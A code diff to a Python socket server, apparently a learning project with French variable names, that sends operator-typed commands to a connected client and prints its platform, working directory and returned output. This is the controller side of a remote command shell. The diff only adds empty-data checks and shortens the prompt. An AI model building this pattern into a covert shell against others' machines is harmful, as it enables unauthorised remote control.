@@ -35,10 +35,14 @@ def socket_send_command_and_receive_all_data(socket_p, command):
     socket_p.sendall(command.encode())
 
     header_data = socket_receive_all_data(socket_p, 13)
+    if not header_data:
+        return None
     longueur_data = int(header_data.decode())
     print("longueur_data =", longueur_data)
 
     data_recues = socket_receive_all_data(socket_p, longueur_data)
+    if not data_recues:
+        return None
     return data_recues.decode()
 
 s = socket.socket()
@@ -62,7 +66,7 @@ while True:
     print(f"Platforme: {plateforme}")
     print(f"Repertoire courant: {cwd}")
 
-    commande = input(client_address[0] + ":" + str(client_address[1]) + " " + cwd + " " + infos_data + " > ")
+    commande = input(client_address[0] + ":" + str(client_address[1]) + " " + cwd + " > ")
 
     if commande == "":
         continue
